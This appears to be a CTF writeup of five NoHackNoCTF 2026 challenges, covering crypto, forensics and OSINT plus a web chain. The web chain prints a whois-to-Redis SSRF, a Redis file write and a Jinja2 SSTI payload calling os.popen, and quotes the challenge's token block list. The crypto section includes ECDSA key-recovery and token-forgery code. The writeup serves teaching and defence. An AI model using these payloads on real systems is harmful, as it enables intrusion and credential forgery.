---
title: "NoHackNoCTF 2026 Writeup: 5 Challenges Solved"
slug: "nohacknoctf-2026-writeup"
description: "Step-by-step NoHackNoCTF 2026 (NHNC) writeup — five challenges across crypto (AES-CTR keystream reuse, ECDSA same-prefix HNP via Turkish İ length expansion + LLL), web (whois TCP-client SSRF into Redis SAVE into Jinja2 SSTI with request.args token smuggling), forensics (Firefox places.sqlite → Proton Drive → ext4 unallocated-block carving → WZ-AES ZIP), and misc/OSINT (boarding-gate photo → EXIF + aircraft registration + airport identification + timetable lookup)."
date: 2026-07-11T04:00:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["NoHackNoCTF 2026"]
tags:
  - "nohacknoctf"
  - "nohacknoctf 2026"
  - "nhnc"
  - "ctf writeup"
  - "aes ctr nonce reuse"
  - "ecdsa nonce prefix"
  - "hidden number problem"
  - "lattice attack lll"
  - "unicode lower length"
  - "turkish dotted i u+0130"
  - "whois ssrf"
  - "redis config set dir"
  - "jinja2 ssti"
  - "request args smuggling"
  - "ext4 carving"
  - "wz-aes zip"
  - "exif osint"
  - "aircraft registration ja06jj"
keywords:
  - "nohacknoctf 2026 writeup"
  - "nhnc 2026 writeup"
  - "modern crypto 101 writeup"
  - "talking to the sun writeup"
  - "final boarding writeup"
  - "kira notes writeup"
  - "who is whois writeup"
  - "aes ctr keystream reuse attack"
  - "ecdsa same prefix hnp lattice attack"
  - "python str lower turkish dotted i length expansion"
  - "brainpoolp512r1 boneh venkatesan"
  - "flask whois ssrf redis config set dir save"
  - "jinja2 ssti request args underscore bypass"
  - "lipsum globals os popen filter attr"
  - "firefox places sqlite forensics"
  - "proton drive share srp url password"
  - "ext4 unallocated block carving"
  - "wz-aes zip pyzipper"
  - "exif date time original offsettime plus 09 00"
  - "kansai international airport terminal 1 kix rjbb"
  - "jetstar japan gk55 taipei"
toc: true
cover:
  image: "/images/articles/nohacknoctf-2026-writeup.png"
  alt: "NoHackNoCTF 2026 writeup — five challenges solved covering AES-CTR nonce reuse, ECDSA nonce-prefix HNP via Python Unicode length expansion, whois-to-Redis SSRF into Jinja2 SSTI, Firefox places.sqlite forensics into ext4 unallocated-block carving, and boarding-gate photo OSINT to a single Jetstar Japan flight number"
---

This **CyberSecurity Elite** writeup breaks down NoHackNoCTF 2026 (NHNC), which shipped a small but well-engineered set of challenges where every one of the five bugs pivots on a language-level or protocol-level detail that looks benign until it isn't: AES-CTR reused with a constant nonce collapses into a one-time pad with a reused pad; an ECDSA nonce whose top 384 bits are `SHA384(salt || account)` becomes the Hidden Number Problem the moment two "distinct" users can be forced to sign under the same account, arranged by exploiting Python's `str.lower()` returning a longer string on Turkish `İ`; `/usr/bin/whois` is a full TCP client whose `-h HOST -p PORT` flags turn a domain-lookup box into a Redis SSRF that writes an RDB snapshot into Flask's template directory for Jinja2 SSTI; Firefox `places.sqlite` is a narrative artefact that leads through a Proton Drive share to an ext4 image whose unallocated blocks still hold a torn note's untorn twin and a WZ-AES ZIP; and a single boarding-gate photograph carries enough EXIF, a legible aircraft registration, and enough background scenery to pin down one specific Jetstar Japan flight from Kansai to Taipei on May 5, 2026.

This is the master writeup covering all five challenges. Original handouts, per-challenge READMEs, and full solver scripts live at [Abdelkad3r/NoHackNoCTF-2026](https://github.com/Abdelkad3r/NoHackNoCTF-2026). Each solve reduces to at most a few dozen lines of Python once the load-bearing primitive is identified; the hours went into identification, not implementation.

## The five NoHackNoCTF 2026 challenges

| Challenge | Category | Bug class / primitive | Flag |
|---|---|---|---|
| modern-crypto-101 | Crypto | AES-CTR keystream reuse. Same key + same 8-byte constant nonce = identical keystream on every call. Rebuild guest 2's plaintext byte-for-byte from `public.txt` + JSON template, XOR to recover keystream, XOR against `admin_cipher` to peel the flag JSON. | `NHNC{c7r_k3y57r34m5_5h0uld_n3v3r_r37urn}` |
| Talking to the Sun | Crypto (web-shaped) | ECDSA over brainpoolP512r1 with nonce `SHA384(salt \|\| account) · 2^128 + urandom(16)`. Turkish `İ` (U+0130) lowercases to two code points, so 33 000 `İ`s pass the pre-lower length check but overflow the post-lower storage cap; different email tails share a truncated stored account (same nonce prefix) but differ in SHA-256 fingerprint (distinct registrations). Six same-prefix sigs → Boneh-Venkatesan lattice → private scalar → forge admin token. | `NHNC{its_always_a_good_time_(_to_play_with_python_lower_)}` |
| Who is Whois | Web | `/api/whois` runs `/usr/bin/whois <domain>`. Input jail bans `_ ; / \ ' " < > = # [ ]` and tokens `flag popen system exec eval import`, but space is allowed and `CONFIG SET dir /app/tpl` is specifically allowlisted. Whois `-h HOST -p PORT OBJECT` is a TCP client → Redis SSRF. `CONFIG SET dir /app/tpl` + `dbfilename shell.tpl` + `SET z aaa{{payload}}bbb` + `SAVE` writes an RDB into Flask's template dir. `GET /render?tpl=shell` renders it through Jinja2. Payload uses `request.args.X` to smuggle in blocked strings (`__globals__`, `os`, `popen`, `/flag`). | `NHNC{wH0is_t0_R3d1s_s5Rf_Tq9x_Z7mP_c96e6295f10f4d31bc48202f9772d8c7}` |
| Kira-Notes | Forensics | Firefox `places.sqlite` → chronological history reads as a stage direction → Proton Drive share (fragment is SRP URL-password) → 500 MB GPT + ext4 image labelled `CASE`. Live directory is a decoy chain of empty files `I will not let you see it`. Carve unallocated blocks for `PK\x03\x04` + `89 50 4E 47` → recover untorn note `0x0Kira1337` + AES-256 (WZ-AES) ZIP. Password is lowercase `0x0kira1337`; `pyzipper` opens it. | `NHNC{n0w_y0u_kn0w_h0w_t0_f0r3ns1c_0x00000Easyyyyyyyyy}` |
| Final Boarding | Misc / OSINT | Single boarding-gate PNG. EXIF `DateTimeOriginal = 2026-05-05 14:49:53 +09:00` fixes the date (Golden Week ending). Fuselage registration `JA06JJ` = Jetstar Japan A320. Airport ID by four independent signals (SMBC jet-bridge, Hainan neighbouring tail, Sky Gate Bridge R viaduct with Izumi silhouette, EXIF compass 134° magnetic) → KIX Terminal 1. Kansai airport timetable returns two GK departures that day; 14:49 EXIF timestamp puts photo 26 minutes before GK55's push-back. | `NHNC{20260505_GK55}` |

The pattern that ties the event together: every challenge involves a **primitive that has more capability than the surface of the challenge suggests**, and the exploit collapses to a Python one-shot once the extra capability is named. `/usr/bin/whois` is really a TCP client with a domain-lookup wrapper. AES-CTR is really a one-time pad if the nonce is constant. `str.lower()` is really a length-changing transform if any Turkish-language code points sneak through. Firefox `places.sqlite` is really a chronological narrative of the challenge author's intended path. A boarding-gate photograph is really four independent hints stacked in the same frame. Recognising the primitive is the whole game; every solver in this repo is at most a couple of dozen lines.

## Methodology — name the extra capability

The pattern that worked across all five challenges: before writing any code, catalogue what the surface component actually does versus what its role in the challenge suggests. For modern-crypto-101 the surface is "AES-CTR encryption service" and the extra capability is that the same (key, nonce, counter) triple produces the same keystream every time, turning encryption into a one-time-pad-with-reused-pad. For Talking to the Sun the surface is "sign my message with your key" and the extra capabilities are (1) `SHA384(salt || account)` fixes 384 of 512 nonce bits per account, and (2) Python's `.lower()` is not length-preserving on U+0130. For Who is Whois the surface is "look up this domain" and the extra capability is that `whois -h HOST -p PORT OBJECT` opens a raw TCP connection to an arbitrary host. For Kira-Notes the surface is "a browser history file" and the extra capability is that the history reads as a chronological stage direction. For Final Boarding the surface is "a photograph" and the extra capability is that EXIF, aircraft registration, background scenery, and neighbouring tail livery are four independent OSINT channels visible in the same frame.

The second discipline is treating flag payloads as post-hoc oracles. `c7r_k3y57r34m5_5h0uld_n3v3r_r37urn` translates as "CTR keystreams should never return"; the exploit is a direct dramatisation of the sentence in the flag. `its_always_a_good_time_(_to_play_with_python_lower_)` names the language quirk. `n0w_y0u_kn0w_h0w_t0_f0r3ns1c_0x00000Easyyyyyyyyy` announces the category the challenge was in (it was deliberately unlabelled). `wH0is_t0_R3d1s_s5Rf` labels the entire exploit chain. NoHackNoCTF is unusually literary about this: reading the flag on your first pop should feel like the writeup has already been written, and the writeup below just fills in the mechanics.

Per-challenge walkthroughs follow.

## 1. modern-crypto-101

AES-CTR under a constant nonce, encrypted five times: four "guest" JSON tickets whose plaintext content comes out of the public handout, and one "admin" ticket containing the flag. Same-keystream reuse means one known plaintext peels the whole keystream and every other ciphertext falls out.

#### Step 1 — Confirm the nonce is constant

`chall.py` top-to-bottom:

```python
KEY   = get_random_bytes(16)
NONCE = b"ticket42"
FLAG  = "NHNC{REDACTED}"

def encrypt(ticket):
    cipher = AES.new(KEY, AES.MODE_CTR, nonce=NONCE)
    return cipher.encrypt(ticket).hex()
```

Every call reads the same 16-byte key, the same 8-byte nonce, and lets `pycryptodome` default the initial counter to zero. So every ciphertext is XORed against the same keystream `K`.

#### Step 2 — See the reuse by eye

Every plaintext starts with `{"event":"modern-crypto-101","role":"` before diverging into `guest` or `admin`. Line up the first 51 bytes (102 hex chars) of each ciphertext:

```
guest_0 = c3c8593c1adc1add7df8c32c549f785f67d6d3a86d486c4fa22322fe0c9848cfa7e66ae8bf2 c0890bc6b f92f2a5dd1b971c73dd0
guest_1 = c3c8593c1adc1add7df8c32c549f785f67d6d3a86d486c4fa22322fe0c9848cfa7e66ae8bf2 c0890bc6b f92f2a5dd1b971c73dd0
guest_2 = c3c8593c1adc1add7df8c32c549f785f67d6d3a86d486c4fa22322fe0c9848cfa7e66ae8bf2 c0890bc6b f92f2a5dd1b971c73dd0
admin   = c3c8593c1adc1add7df8c32c549f785f67d6d3a86d486c4fa22322fe0c9848cfa7e66ae8bf2 a1998a671 f92f2a5dd1b971c73dd0
                                                                                     ↑ 5 bytes differ
```

Four guests are byte-identical for 37 bytes, diverge for exactly 5 bytes at the `guest` / `admin` boundary, then re-align on `","name":"`. `admin[37:42] XOR guest[37:42] = b"guest" XOR b"admin" = 06 11 08 1a 1a`. Same keystream, confirmed before any decryption code exists.

#### Step 3 — Reconstruct guest 2's plaintext

Guest 2 has the longest ciphertext (171 bytes) and comfortably covers admin_cipher's 160. The JSON template is fixed; `name` and `seat` come from `public.txt`:

```python
def make_guest(name, seat):
    return json.dumps({
        "event": "modern-crypto-101",
        "role":  "guest",
        "name":  name,
        "seat":  seat,
        "note":  "enjoy the workshop",
    }, separators=(",", ":")).encode()

pt2 = make_guest(
    "this_chal_not_need_read_read_read_read_read_read_read_read_read_read_read",
    "N-0705",
)
```

`separators=(",", ":")` and Python 3.7+ dict-order preservation make this byte-identical to what `chall.py` produced.

#### Step 4 — Peel the flag

```python
ct2 = bytes.fromhex(guest_cipher_2)
assert len(pt2) == len(ct2)
keystream = bytes(p ^ c for p, c in zip(pt2, ct2))

admin_ct  = bytes.fromhex(admin_cipher)
admin_pt  = bytes(a ^ k for a, k in zip(admin_ct, keystream))
print(admin_pt.decode())
```

Output:

```json
{"event":"modern-crypto-101","role":"admin","name":"organizer","seat":"ROOT",
 "note":"priority access granted","flag":"NHNC{c7r_k3y57r34m5_5h0uld_n3v3r_r37urn}"}
```

Per-challenge README + `solve.py` + handout: [crypto/modern-crypto-101](https://github.com/Abdelkad3r/NoHackNoCTF-2026/tree/main/crypto/modern-crypto-101).

The flag payload spells out the fix: "CTR keystreams should never return." Nonce-uniqueness is the whole rule; any implementation that shares `(key, nonce, counter)` between two encryptions has collapsed AES-CTR into a one-time pad with a reused pad, which is a stream cipher's worst failure mode.

## 2. Talking to the Sun

A Flask app signs personalised sentences with ECDSA over brainpoolP512r1. The nonce is `SHA384(nonce_salt || account) · 2^128 + urandom(16)`, so the top 384 bits are a *fixed prefix per account*: textbook setup for the Hidden Number Problem. Each account signs only once, so we need multiple registrations that resolve to the same account at signing time. That collision is arranged by a Python `.lower()` length-expansion bug on Turkish `İ`.

#### Step 1 — Recognise the same-prefix HNP setup

The nonce construction from `app.py`:

```python
def nonce_for_account(account: str) -> int:
    prefix = hashlib.sha384(NONCE_SALT + account.encode("utf-8")).digest()
    while True:
        raw = prefix + os.urandom(16)
        value = int.from_bytes(raw, "big") % ORDER
        if value:
            return value
```

`k = P · 2^128 + t` with `P = SHA384(salt || account)` (fixed for a given account) and `t = urandom(16)` (fresh 128 bits per signature). Differencing two same-account signatures:

```
k_i - k_0 ≡ t_i - t_0 (mod n),   |t_i - t_0| < 2^129
```

That's Boneh-Venkatesan HNP with small residuals. Six signatures on a 512-bit curve is comfortable headroom for LLL.

#### Step 2 — Spot the mismatched length limits

```python
MAX_ACCOUNT_CHARS   = 0x9999    # 39321
STORED_ACCOUNT_CHARS = 0x10000  # 65536

def check_account(value: str) -> tuple[bool, str]:
    account = (value or "").strip()
    if not account or len(account) >= MAX_ACCOUNT_CHARS:
        return False, ""
    if ACCOUNT_RE.fullmatch(account) is None:
        return False, ""
    return True, account.lower()

def stored_account(account: str) -> str:
    return account[:STORED_ACCOUNT_CHARS]
```

Two constants sitting next to each other, `0x9999` and `0x10000`, with `.lower()` sandwiched between them. For ASCII input the two limits are consistent (nothing that passes `< 39321` needs truncating at 65536). But `check_account` returns `account.lower()`, and if `.lower()` can make a string longer than itself, the two limits diverge.

#### Step 3 — Pivot on Turkish `İ`

Python's Unicode `.lower()` uses the full case-folding table. U+0130 (LATIN CAPITAL LETTER I WITH DOT ABOVE) lowercases to *two* code points: `i` (U+0069) followed by U+0307 (COMBINING DOT ABOVE):

```
>>> "İ".lower()
'i̇'
>>> len("İ".lower())
2
```

An account with 33 000 `İ`s becomes 66 000 code points after lowercasing. Add a short suffix and the arithmetic lands cleanly:

```
email = "a@" + "İ" * 33000 + ".abcdef"
len(email)     = 2 + 33000 + 7 = 33009    < 39321   ✓ passes check_account
len(lower)     = 2 + 66000 + 7 = 66009    > 65536   → truncated on store
```

Two emails that differ only in the trailing 6 characters have (a) identical `stored_account` (position 65536 falls inside the identical `i̇`-run) and (b) different `account_fingerprint` (SHA-256 of the full lowercased string, which sees the tails). So both register as distinct users but sign under the same nonce prefix.

#### Step 4 — Collect six same-prefix signatures

Six accounts of the shape `a@ + İ×33000 + .<random6>`. For each: register → login → `/api/generate` returns a `singen.<b64payload>.<b64sig>` token. Decode to `(account, message, r, s)`. All six tokens must carry an *identical* `account` field in their payload (proof the collision worked); if they don't, LLL will not converge.

At ~4 seconds per round-trip (large PBKDF2 rounds on ~130 KB UTF-8 registration payload), six signatures take about 30 seconds, well inside the 300s instance TTL.

#### Step 5 — Run LLL

Let `a_i = s_i^-1 r_i` and `c_i = s_i^-1 z_i` (with `z_i = SHA512(canonical(account, message_i))`). ECDSA gives `k_i = a_i · d + c_i (mod n)`. Differencing against sig 0:

```
(a_i - a_0) · d + (c_i - c_0) ≡ (t_i - t_0)  (mod n),   |t_i - t_0| < 2^129
```

Build the standard Boneh-Venkatesan lattice with scaling factor `s = 2^383` (balances the target-vector norm against d's natural ~2^512 size), reduce with `fpylll`, scan the reduced basis for the row whose first M entries are small and whose constant slot is `±2^512`. The M-th coordinate of that row is `±d`.

Representative live run:

```
[*] target: http://nhnc2.whale-tw.com:10022   collecting 6 same-prefix signatures
[+] sig 6/6 in 5.8s
[*] all 6 tokens share the stored account (len=65536 code points) → same nonce prefix
[*] running LLL on 6-sig lattice
[+] recovered d bits = 511
```

#### Step 6 — Forge the admin token

With `d` in hand, sign a fresh token with `account = "whale@whale-tw.com"` (the admin string checked in `verify_token`) and any `message` (the flag branch doesn't compare messages):

```python
account = "whale@whale-tw.com"
message = "sing"
z = int.from_bytes(hashlib.sha512(canonical(account, message).encode()).digest(), "big")
k = random.randrange(1, n)
r = (k * G).x() % n
s = (inverse_mod(k, n) * (z + r * d)) % n
sig = r.to_bytes(64, "big") + s.to_bytes(64, "big")
token = f"singen.{b64u(canonical(account, message).encode())}.{b64u(sig)}"
```

`POST /api/verify` returns:

```json
{"flag":"NHNC{its_always_a_good_time_(_to_play_with_python_lower_)}","message":"sing","ok":true}
```

Per-challenge README + `solve.py`: [crypto/talking-to-the-sun](https://github.com/Abdelkad3r/NoHackNoCTF-2026/tree/main/crypto/talking-to-the-sun).

The takeaway sits in three separate places at once: `str.lower()` is not length-preserving in Unicode (`İ`, `ß`, and a handful of others); any code that validates length pre-normalisation and stores/limits post-normalisation is a truncation-linkage bug; and a hashed prefix is not a nonce because determinism in the top bits collapses ECDSA to HNP as soon as an attacker gets amplification of signatures under the same identity. RFC 6979 deterministic nonces close the whole class.

## 3. Who is Whois

A Flask whois lookup with an aggressive input jail. The filter blocks `_`, `/`, `'`, `"`, `;`, `<`, `>`, `=`, `#`, `[`, `]`, and case-insensitive tokens `flag`, `read`, `popen`, `system`, `exec`, `eval`, `subprocess`, `import`. But the field is handed to `/usr/bin/whois` which accepts `-h HOST -p PORT OBJECT` and is therefore a TCP client. Aim it at local Redis, plant an SSTI payload into an RDB file inside Flask's template directory, render it through Jinja2 via `/render?tpl=shell`, smuggle every blocked string in through `request.args`.

#### Step 1 — Turn whois into a TCP client

Space (`0x20`) isn't blocked. `-h`, `-p`, and short numeric strings pass the character jail:

```
POST /api/whois  domain=-h 127.0.0.1 -p 6379 PING
+PONG
POST /api/whois  domain=-h 127.0.0.1 -p 6379 INFO
# redis_version:6.2.22 ...
POST /api/whois  domain=-h 127.0.0.1 -p 6379 COMMAND COUNT
:214
```

Local Redis with 214 commands available. `MODULE`, `SCRIPT`, `KEYS`, `FLUSHALL` are renamed and unreachable, but `CONFIG`, `SET`, `SAVE`, `APPEND`, `SCAN`, `CLIENT` all work. Note: `whois` passes its arguments through lowercasing, so any all-caps identifier we care about has to survive lowercase or be smuggled through a different channel.

#### Step 2 — Locate the template root

`GET /render?tpl=whatever` for any unknown name returns `template not found: /app/tpl/whatever.tpl`, telling us the exact template root (`/app/tpl/`) and extension (`.tpl`). Path traversal into `?tpl=..%2fflag` resolves and still fails, so we need to write a *new* `.tpl` file that Flask's loader will find.

#### Step 3 — Redis SAVE into `/app/tpl/shell.tpl`

The input jail specifically allowlists the string `CONFIG SET dir /app/tpl`. Any other `dir` value (`/tmp`, `/etc`, `/app`) is rejected. That one allowlist entry lands the RDB in exactly the folder Flask reads templates from:

```
domain=-h 127.0.0.1 -p 6379 CONFIG SET dir /app/tpl        →  +OK
domain=-h 127.0.0.1 -p 6379 CONFIG SET dbfilename shell.tpl →  +OK
domain=-h 127.0.0.1 -p 6379 SET z aaa{{PAYLOAD}}bbb        →  +OK
domain=-h 127.0.0.1 -p 6379 SAVE                            →  +OK
```

`GET /render?tpl=shell` reads the RDB as a template. The bytes are noisy (RDB magic, length prefixes, invalid UTF-8 replaced with U+FFFD), but Jinja2 treats everything outside `{{...}}` as literal output, so our payload survives verbatim between the `aaa`/`bbb` markers.

#### Step 4 — Bypass the character and token jail with request.args

Classic Jinja2 SSTI needs underscores (`__class__`, `__mro__`, `__globals__`, `__builtins__`) and strings like `os`, `popen`, `flag`. All blocked by the jail. But the jail only sees the stored value; the *render* call also has access to `request.args`, and the query string never goes through the jail:

```jinja
{{ request.args.g }}   →  __globals__   (when ?g=__globals__)
{{ request.args.b }}   →  __builtins__
{{ request.args.o }}   →  os
{{ request.args.p }}   →  popen
{{ request.args.c }}   →  /flag
```

Every blocked string is smuggled in as a URL parameter; the payload only references them symbolically.

#### Step 5 — Pivot into Python globals via lipsum

Flask's Jinja2 context has `lipsum` (`jinja2.utils.generate_lorem_ipsum`), which is a regular Python function. Its `__globals__` are the `jinja2/utils.py` module dict, which already `import os` at module scope. So:

```jinja
{{ lipsum|attr(request.args.g) }}         →  <module dict>
{{ (lipsum|attr(request.args.g))|list }}  →  [..., 'os', ...]
```

The `os` module is in the dict. But `|attr(name)` only does `getattr`, and `dict.os` is not an attribute (`dict.__getitem__` would work but that's inaccessible without `[`). So `.get(name)` is the right pivot, since it's a plain method:

```jinja
{{ (lipsum|attr(request.args.g)).get(request.args.o) }}   →  <module 'os'>
```

Parser precedence: `|` binds looser than `.`, so `lipsum|attr(g).items` parses as `lipsum | attr(g.items)`. Every filter chain must be parenthesised to force the right precedence.

#### Step 6 — Fire

Skip `.read()` (blocked substring) by relying on the fact that `os.popen(cmd)` returns an iterable; `|list` iterates it into a Python list of output lines and prints them:

**Stored in Redis (in the RDB, between the aaa/bbb markers):**

```jinja
{{ ((lipsum|attr(request.args.g)).get(request.args.o)
     |attr(request.args.p))(request.args.c)|list }}
```

**Sent as the render request:**

```
GET /render?tpl=shell&g=__globals__&o=os&p=popen&c=/flag
```

Expansion at render time:

```
lipsum.__globals__            (attr filter with query-provided name)
       .get("os")             (dict.get returning the os module)
       |attr("popen")         (filter → os.popen)
       ("/flag")              (call the function)
       |list                  (turn the pipe iterator into a list)
```

Output between markers:

```
['NHNC{wH0is_t0_R3d1s_s5Rf_Tq9x_Z7mP_c96e6295f10f4d31bc48202f9772d8c7}\n']
```

Per-challenge README + `solve.py`: [web/who-is-whois](https://github.com/Abdelkad3r/NoHackNoCTF-2026/tree/main/web/who-is-whois).

Three independent decisions had to compose: `whois` is a TCP client, Redis is on localhost with `CONFIG` still reachable, and Flask's template loader reads from a directory a Redis SAVE can write to. Any one of the three, fixed, closes the whole chain: parse the domain with a library instead of shelling out; rename `CONFIG` to `""`; make `/app/tpl` a read-only bind mount.

## 4. Kira-Notes

The handout is a single `places.sqlite`, Firefox's places database. What follows is entirely reconstructed from browsing history.

#### Step 1 — Read the history as a stage direction

```sql
sqlite> SELECT id, url, title FROM moz_places ORDER BY id;
```

The rows tell a chronological story: K-On videos, GitHub `UmmItKin` profile (bio "81 repositories available"), the same profile reloaded a few hours later ("82 repositories" after a new repo pushed), `UmmItKin/Kira-Notes`, a detour through `torvalds/linux` and `sqlmap` (red herrings), CTFtime NHNC event page, Proton search, and:

```
https://drive.proton.me/urls/00MNVW0SHG#do4wWWpAQ0Lw
```

The fragment `#do4wWWpAQ0Lw` is Proton Drive's SRP URL-password (not a decryption key; you can tell because `POST /drive/urls/<token>/info` returns `Flags: 2` and a `UrlPasswordSalt`, which is the "password-protected public link" regime). Then the history ends with visits to a live "Retro Hacker Archive" site whose downloads all return raw nginx 404s under `/dl/...`, pure decoration.

The single actionable lead is the Proton Drive URL.

#### Step 2 — Drive Proton via Playwright

Proton Drive doesn't serve to `curl` (SRP + PGP + block decryption happens in JavaScript). Playwright headless clicks each row's Download button:

```python
await page.goto("https://drive.proton.me/urls/00MNVW0SHG#do4wWWpAQ0Lw",
                wait_until="networkidle", timeout=120_000)
buttons = await page.query_selector_all("button, a")
for idx in (7, 10, 13):
    async with page.expect_download(timeout=600_000) as dl_info:
        await buttons[idx].click()
    (await dl_info.value).save_as(...)
```

Three files land: `noth_____.png` (a photo of a *torn* paper note reading `0x0Kira` with the tail missing), `Some Backup 01.png` (screenshot decoy), and `of.img` (500 MB, GPT + ext4 labelled `CASE`).

The filename `noth_____.png` (five literal underscores) is data: the note is torn, and five characters are missing.

#### Step 3 — Slice the ext4 partition

`of.img` is GPT-partitioned. Slice out LBA 2048..1021951 to get the ext4 volume:

```python
import struct
d = open("of.img", "rb").read(4096)
first, last = struct.unpack_from("<QQ", d, 1024 + 32)
# 2048, 1021951
```

7-Zip's ext driver lists the live directory tree:

```
home/ctf/Downloads/I
home/ctf/Downloads/will
home/ctf/Downloads/not
home/ctf/Downloads/let
home/ctf/Downloads/you
home/ctf/Downloads/see
home/ctf/Downloads/it
```

Seven empty files spelling `I will not let you see it`. Pure trolling. The real material is in unallocated blocks: files whose directory entries were deleted but whose content still sits in unused ext4 space until reallocation.

#### Step 4 — Carve PNG and ZIP signatures

Two file signatures do all the work:

- PNG: `89 50 4E 47 0D 0A 1A 0A` ... `IEND\xaeB\x60\x82`
- ZIP local file header: `PK\x03\x04`; EOCD: `PK\x05\x06` + 22 bytes

```python
import re
part = open("of_part.img", "rb").read()

png_start = re.search(rb"\x89PNG\r\n\x1a\n", part).start()
png_end   = part.find(b"IEND\xaeB\x60\x82", png_start) + 8
open("wtf.png", "wb").write(part[png_start:png_end])

idx       = part.find(b"flag.txt")
zip_start = part.rfind(b"PK\x03\x04", 0, idx)
eocd      = part.find(b"PK\x05\x06", idx)
open("final.zip", "wb").write(part[zip_start:eocd + 22])
```

Two artefacts pop out. `wtf.png` is the untorn note: `0x0Kira1337`. `final.zip` is 255 bytes with one AES-256 (WZ-AES) entry `flag.txt` (55 bytes).

#### Step 5 — Open the AES ZIP

`unzip` refuses ("need PK compat. v5.1"). Stock 7-Zip on some builds reports success but writes zero bytes. `pyzipper` handles WZ-AES / AE-2 correctly. Case matters:

```python
import pyzipper
for pw in ("0x0Kira1337", "0x0kira1337"):
    try:
        with pyzipper.AESZipFile("final.zip") as z:
            z.setpassword(pw.encode())
            print(pw, "->", z.read("flag.txt"))
            break
    except RuntimeError as e:
        print(pw, "FAIL:", e)
```

```
0x0Kira1337 FAIL: Bad password for file 'flag.txt'
0x0kira1337 -> b'NHNC{n0w_y0u_kn0w_h0w_t0_f0r3ns1c_0x00000Easyyyyyyyyy}\n'
```

Per-challenge README + `solve.py` + carved artefacts: [forensics/kira-notes](https://github.com/Abdelkad3r/NoHackNoCTF-2026/tree/main/forensics/kira-notes).

Two nice touches worth naming. The disk-image label `CASE` is a forensics-analyst wink; the volume literally names itself as the work item. And the flag itself was the puzzle's payoff: the challenge card deliberately omitted the category, and reading `n0w_y0u_kn0w_h0w_t0_f0r3ns1c` aloud reveals which category it was.

## 5. Final Boarding

A single boarding-gate photograph. The prompt asks for `NHNC{YYYYMMDD_FLIGHT}`: the date the photo was taken and the IATA flight number the photographer was about to board. Four independent signals in the file converge on exactly one flight.

#### Step 1 — EXIF for the date

```
$ exiftool Final_boarding.png | grep -iE 'date|offset|make|model|gps'
DateTimeOriginal      : 2026:05:05 14:49:53
OffsetTimeOriginal    : +09:00
Model                 : Pixel 8
GPSImgDirection       : 134/1 (Magnetic)
```

Date pinned to 2026-05-05 JST: Golden Week's Children's Day, the last consecutive public holiday. The lat/lon fields have been stripped, but `GPSImgDirection` survives: 134° magnetic. Kansai's magnetic declination is about −7°, giving a true bearing near 127° (south-east).

#### Step 2 — Read the aircraft registration

Crop the tail-side of the fuselage:

```python
img = Image.open("Final_boarding.png")
w, h = img.size
img.crop((int(w*0.2), int(h*0.32), int(w*0.95), int(h*0.55))).save("tail.png")
```

Between the "star" and the engine: `JA06JJ`. That's the pattern of a Jetstar Japan (JJP / GK) registration; the `JA0xJJ` block was assigned to the A320 fleet. Cross-check against airframe databases confirms it's a Jetstar Japan Airbus A320-232(WL).

#### Step 3 — Identify the airport from four signals

Four hints stacked in the same frame:

1. **Ground service equipment.** A white truck with a large blue `ANA` wordmark: ANA-handled ramp.
2. **Jet-bridge branding.** `SMBC` panelling on the bridge: Sumitomo Mitsui, familiar splash at KIX Terminal 1.
3. **Neighbouring tail.** Yellow tail with a red phoenix curl: Hainan Airlines livery. Hainan's Japan destinations in 2026 are KIX, NRT, NGO, ruling out Fukuoka, New Chitose, Naha, and most Jetstar Japan regional bases.
4. **Background scenery.** A long horizontal viaduct in front of a mountain silhouette: the Sky Gate Bridge R (3.75 km) to Rinku Town backed by the Izumi range. The 134° magnetic direction from EXIF is the south-east arc, exactly where a passenger at a T1 pier gate would find that view.

One airport satisfies all four: Kansai International Airport (KIX / RJBB), Terminal 1.

#### Step 4 — Timetable lookup

Kansai's own flight-search page for Jetstar Japan departures on that day:

```
GET https://www.kansai-airport.or.jp/en/flight/kix_searchresult
        ?KUBUN=DD&submit=1&AIRLINE=GK

15:15  TAIPEI  GK55 / Jetstar Japan   Terminal T1 - C
23:25  TAIPEI  GK57 / Jetstar Japan   Terminal T1 - C
```

Two GK departures. The 14:49 EXIF timestamp puts the photographer 26 minutes before GK55's 15:15 push-back: right at final boarding. GK57 is 8 hours later and ruled out on time alone.

Cross-check on FlightAware: `JJP55 06:30 UTC → 15:30 JST daily, RJBB → RCTP`. Daily A320 Kansai-to-Taipei rotation.

Flag: `NHNC{20260505_GK55}` (IATA `GK55`, not the ATC callsign `JJP55`; the prompt was explicit about that).

Per-challenge README + tail crops: [misc/final-boarding](https://github.com/Abdelkad3r/NoHackNoCTF-2026/tree/main/misc/final-boarding).

## Cross-cutting defender notes

Five patterns recur across NoHackNoCTF 2026 and translate directly into review heuristics.

**Nonce constants are not nonces.** modern-crypto-101 collapses AES-CTR by hardcoding `NONCE = b"ticket42"`; Talking to the Sun collapses ECDSA by deriving 384 nonce bits from `SHA384(salt || account)`. Both patterns share the same fingerprint: a "cryptographic nonce" whose value is determined by something the attacker can control or repeat. Every review of a symmetric or asymmetric primitive that uses a nonce should trace where the nonce comes from and verify it is (a) freshly random per operation, or (b) a strictly monotonic counter that can never be reused. Any hash of attacker-controllable input is a red flag; even with a secret salt, if the attacker can amplify signatures under the same input, HNP is on the table.

**Case-folding, normalisation, and length are language-level traps.** Talking to the Sun's Turkish `İ` is the canonical example, but the general pattern is broader: any code that validates a property (length, character set, format) on one form of a string and then stores or operates on a different form has a linkage bug. `NFKC` normalisation before both validation and storage closes the general class; picking one canonical form (`casefold()` + `NFKC`) and using it everywhere closes the specific instance.

**Command-line tools are their full command line.** `whois` isn't a domain-lookup function; it's a TCP client whose default behaviour happens to be domain lookup. Same for `curl` (URL fetcher), `ssh` (arbitrary command runner), `nc` (protocol adapter), `xdg-open` (browser launcher), `git clone` (writes to filesystem). Any code that shells out to a tool with attacker-controlled input has to assume the attacker can invoke every flag the tool supports. `subprocess.run([tool, "--", input], check=True)` with a fixed argument vector and a `--` separator is the closest safe form; a character/token blacklist trying to re-implement argument parsing by regex is a losing game.

**Redis + writable filesystem = arbitrary write.** `CONFIG SET dir` + `SAVE` is the smallest-known Redis-to-file-write primitive. The mitigation is `rename-command CONFIG ""` in production (dropping the command entirely). The moment `CONFIG SET dir` is unreachable, this pattern is closed. Auth doesn't help if the SSRF is from the same host (Redis on localhost trusts everything by default); the real fix is removing the write primitive.

